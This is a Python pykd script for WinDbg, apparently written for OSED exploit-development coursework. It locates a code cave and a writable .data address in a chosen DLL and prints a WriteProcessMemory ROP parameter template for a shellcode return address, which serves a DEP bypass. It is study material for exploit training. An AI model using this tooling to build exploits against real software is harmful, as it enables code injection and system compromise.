import pykd
import re
import sys

import argparse

# Instantiate the parser
parser = argparse.ArgumentParser(description='This automates the first part of module 10.4 OSED.')
parser.add_argument('--module', help='The DLL name without .dll')
parser.add_argument('--debug', action='store_true', help='Debug information')
args = parser.parse_args()

if (args.module == None):
    parser.print_help(sys.stderr)
    sys.exit(1)

# Arguments
module_name = args.module
debug = args.debug #False

# Regexes to gain information
value_regex = "\s\s(.*)\\n"
math_regex = "\=\s(.*)\\n"
end_address_regex = "End Address\:\s+(.*)"

def windbg_parse(command, regex, prepend0=False):
    _info = pykd.dbgCommand(command)
    info = re.findall(regex, _info)[0]
    if prepend0:
        return info.lstrip("0")
    return info


print("[*] Finding offset information for WriteProcessMemory for module " + module_name)
print("[-] Finding information for lpBaseAddress")

# PE Header Offset
offset_pe_header = windbg_parse("dd " + module_name + " + 3c L1", value_regex, True)
# Code Section Offset
offset_code_section = windbg_parse("dd " + module_name + " + " + offset_pe_header + " + 2c L1", value_regex, True)
# Code Section Address
code_section = windbg_parse("? " + module_name + " + " + offset_code_section, math_regex)
print("\t[+] Start code section: " + code_section)
# End Address Code Section
end_code_section = windbg_parse("!address " + str(code_section), end_address_regex)
print("\t[+] End code section: " + end_code_section)

if debug:
    print("\t[+] Address information:")
    print(pykd.dbgCommand("!address " + code_section))

code_cave = 0
#print("\t[+] Searching for a code cave")
for i in range(4,10):
  _range = i * 100
  res0 = pykd.dbgCommand("dd " + end_code_section + " - " + str(_range))
  amount_zeroes = len(re.findall("00000000", res0))
  if amount_zeroes == 32:
    print("\t[+] Found code cave at offset " + str(_range))
    code_cave = _range
    break

# Module offset
offset_module = windbg_parse("? (" + end_code_section + " - " + str(code_cave) + ") - " + module_name, math_regex, True)
print("\t[+] Offset for the module: " + offset_module)
if offset_module.endswith("00"):
    offset_module = offset_module[0:-1] + "4"
    print("\t\t[+] !!! NULL_BYTES: " + offset_module)

print("\t--------------------------------------")
print("\t[->] Use of offset " + offset_module + " together with the address leaked and use it as the lpBaseAddress")
print("\n")

print("[-] Finding information for lpNumberOfBytesWritten")
header_info = pykd.dbgCommand("!dh -a " + module_name)
# Get virtual size & address
virtual_size = re.findall("\.data((.|\n)*?([A-Z0-9]+)\svirtual size)", header_info)[0][2]
virtual_addr = re.findall("\.data((.|\n)*?([A-Z0-9]+)\svirtual address)", header_info)[0][2]

print("\t[+] Offset of data section: " + virtual_addr)
print("\t[+] Size of the section: " + virtual_size)

print("\t[-] Check if there is data at the end of the .data section")
after_data_section = windbg_parse("? " + module_name + " + " + virtual_addr + " + " + virtual_size + " + 4", math_regex, True)
zeroes_check = pykd.dbgCommand("dd " + after_data_section)
if debug:
    print(zeroes_check)
amount_zeroes = len(re.findall("00000000", zeroes_check))
if amount_zeroes == 32:
    print("\t\t[+] GOOD: Found no data at the end of .data section")
_protection = pykd.dbgCommand("!vprot " + after_data_section)
if debug:
    print(_protection)
protection = re.findall("^Protect:\s+[a-z0-9]+\s+(.*)", _protection, re.MULTILINE)[0]
print("\t[+] Protection: " + protection)
if protection == "PAGE_READWRITE":
    print("\t\t[+] This point can be used!")
offset_from_base = windbg_parse("? " + after_data_section + " - " + module_name, math_regex, True)
print("\t[+] Offset from base address: " + offset_from_base)

print("\n\n====== PYTHON CODE ======")
print("dllBase = moduleFunc - OFFSET")
print("wpm  = pack(\"<L\", (WPMAddr)) \t\t# WriteProcessMemory address")
print("wpm += pack(\"<L\", (dllBase + 0x" + offset_module + ")) \t# Shellcode return address")
print("wpm += pack(\"<L\", (0xFFFFFFFF)) \t# hProcess (-1)")
print("wpm += pack(\"<L\", (dllBase + 0x" + offset_module + ")) \t# lpBaseAddress - code cave address")
print("wpm += pack(\"<L\", (0x41414141)) \t# lpBuffer ")
print("wpm += pack(\"<L\", (0x42424242)) \t# nSize ")
print("wpm += pack(\"<L\", (dllBase + 0x" + offset_from_base + ")) \t# lpNumberOfBytesWritten")
print("wpm += b\"A\" * 0x10")

print("\n")
# Preferred base address
base_address = windbg_parse("dd " + module_name + " + " + offset_pe_header + " + 34 L1", value_regex)
print("[*] ROP: Preferred base address: 0x" + base_address)
